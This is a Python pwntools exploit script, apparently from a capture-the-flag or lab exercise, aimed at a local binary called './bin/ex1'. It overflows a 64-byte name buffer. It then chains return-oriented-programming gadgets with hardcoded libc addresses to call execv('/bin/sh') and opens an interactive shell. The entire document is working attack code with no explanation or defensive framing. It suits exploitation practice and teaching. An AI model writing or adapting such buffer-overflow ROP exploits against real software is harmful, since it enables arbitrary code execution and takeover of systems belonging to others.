#!/usr/bin/env python3


from pwn import *


binary = ELF("./bin/ex1")
context.binary = binary

#libc base 0x7ffff7c00000

payload = b'A' * 64 # for name offset
payload += p64(0x7FFFF7C2A3E5)#pop rdi ret from libc + base
payload += p64(0x7ffff7dd8678)#addr bin sh
payload += p64(0x7FFFF7C2BE51)#pop rsi ret from libc +base
payload += p64(0)#simulate argv to null 
payload += p64(0x7ffff7ceb1c0)#addr execv
#payload += p64(0x7ffff7c50d70)#addr system()
payload += p64(0x7FFFF800101A)#ret to align
#payload += p64(0x7ffff7c455f0)#addr ret for system exit()
#payload += p64(0x7ffff7dd8678)#addr bin sh
payload += b'\n'


io = process(binary.path)
io.recvuntil("Welcome to the .hidden Flying Experience! Do you want to check your booking?")
io.sendline("0")
io.recvuntil("Please input your name to check your booking:")
io.sendline(payload)
io.interactive() 
